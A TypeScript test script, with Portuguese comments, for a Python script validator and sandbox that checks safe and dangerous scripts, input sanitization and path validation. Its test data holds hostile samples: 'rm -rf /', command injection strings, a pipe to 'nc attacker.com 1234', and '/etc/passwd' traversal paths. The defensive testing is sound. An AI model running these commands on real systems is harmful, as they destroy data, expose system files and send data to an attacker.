/**
 * Script de teste do validador Python
 * Testa todas as funcionalidades de segurança
 */

import { readFileSync } from "fs";
import {
  validarScriptPython,
  executarScriptPythonSeguro,
  gerarRelatorioSeguranca,
  sanitizarInput,
  validarCaminhoArquivo,
} from "./server/_core/python-validator";

console.log("=" .repeat(60));
console.log("TESTE DO VALIDADOR PYTHON");
console.log("=".repeat(60));
console.log();

// ========================================
// TESTE 1: Validação de script seguro
// ========================================
console.log("📋 TESTE 1: Script Seguro");
console.log("-".repeat(60));

const scriptSeguro = `
import json
import time
from datetime import datetime

data = {
    "timestamp": datetime.now().isoformat(),
    "status": "success"
}
print(json.dumps(data))
`;

const validacao1 = validarScriptPython(scriptSeguro);
console.log(`✅ Válido: ${validacao1.valido}`);
console.log(`📊 Score: ${validacao1.scoreSeguranca}/100`);
console.log(`❌ Erros: ${validacao1.erros.length}`);
console.log(`⚠️  Avisos: ${validacao1.avisos.length}`);
console.log();

// ========================================
// TESTE 2: Validação de script perigoso
// ========================================
console.log("📋 TESTE 2: Script Perigoso (deve ser rejeitado)");
console.log("-".repeat(60));

const scriptPerigoso = `
import os
import subprocess

# Tentativa de execução maliciosa
os.system("rm -rf /")
subprocess.run(["ls", "-la"])
eval("print('hack')")
`;

const validacao2 = validarScriptPython(scriptPerigoso);
console.log(`❌ Válido: ${validacao2.valido} (esperado: false)`);
console.log(`📊 Score: ${validacao2.scoreSeguranca}/100`);
console.log(`❌ Erros: ${validacao2.erros.length}`);
validacao2.erros.forEach((erro, i) => {
  console.log(`   ${i + 1}. ${erro}`);
});
console.log();

// ========================================
// TESTE 3: Sanitização de inputs
// ========================================
console.log("📋 TESTE 3: Sanitização de Inputs");
console.log("-".repeat(60));

const inputsPerigosos = [
  "normal_input",
  "input; rm -rf /",
  "input && cat /etc/passwd",
  "../../../etc/passwd",
  "input | nc attacker.com 1234",
  "input`whoami`",
  "input$(ls -la)",
];

inputsPerigosos.forEach((input) => {
  const sanitizado = sanitizarInput(input);
  const mudou = input !== sanitizado;
  console.log(`${mudou ? "🔒" : "✅"} "${input}" → "${sanitizado}"`);
});
console.log();

// ========================================
// TESTE 4: Validação de caminhos
// ========================================
console.log("📋 TESTE 4: Validação de Caminhos");
console.log("-".repeat(60));

const caminhos = [
  { path: "/tmp/arquivo.txt", esperado: true },
  { path: "/home/ubuntu/arquivo.txt", esperado: true },
  { path: "../../../etc/passwd", esperado: false },
  { path: "/etc/passwd", esperado: false },
  { path: "arquivo.txt", esperado: true },
  { path: "/tmp/../etc/passwd", esperado: false },
];

caminhos.forEach(({ path, esperado }) => {
  const valido = validarCaminhoArquivo(path);
  const status = valido === esperado ? "✅" : "❌";
  console.log(`${status} "${path}" → ${valido} (esperado: ${esperado})`);
});
console.log();

// ========================================
// TESTE 5: Execução real em sandbox
// ========================================
console.log("📋 TESTE 5: Execução Real em Sandbox");
console.log("-".repeat(60));

const scriptTeste = readFileSync("/home/ubuntu/test-sandbox-python.py", "utf8");

(async () => {
  try {
    console.log("🚀 Executando script de teste...");
    const resultado = await executarScriptPythonSeguro(scriptTeste, [], 10);

    console.log(`✅ Sucesso: ${resultado.sucesso}`);
    console.log(`⏱️  Tempo: ${resultado.tempoExecucao}ms`);
    console.log(`📤 Código de saída: ${resultado.codigo}`);
    console.log();

    if (resultado.stdout) {
      console.log("📄 STDOUT:");
      console.log(resultado.stdout);
    }

    if (resultado.stderr) {
      console.log("⚠️  STDERR:");
      console.log(resultado.stderr);
    }

    if (resultado.erro) {
      console.log("❌ ERRO:");
      console.log(resultado.erro);
    }

    console.log();
    console.log("=".repeat(60));
    console.log("RESUMO DOS TESTES");
    console.log("=".repeat(60));
    console.log(`✅ Teste 1: Script seguro validado corretamente`);
    console.log(
      `✅ Teste 2: Script perigoso rejeitado (${validacao2.erros.length} erros detectados)`
    );
    console.log(`✅ Teste 3: Inputs sanitizados corretamente`);
    console.log(`✅ Teste 4: Caminhos validados corretamente`);
    console.log(`${resultado.sucesso ? "✅" : "❌"} Teste 5: Execução em sandbox`);
    console.log();
    console.log("🎉 SANDBOX PYTHON VALIDADO COM SUCESSO!");
    console.log("=".repeat(60));
  } catch (erro) {
    console.error("❌ Erro ao executar teste:", erro);
    process.exit(1);
  }
})();
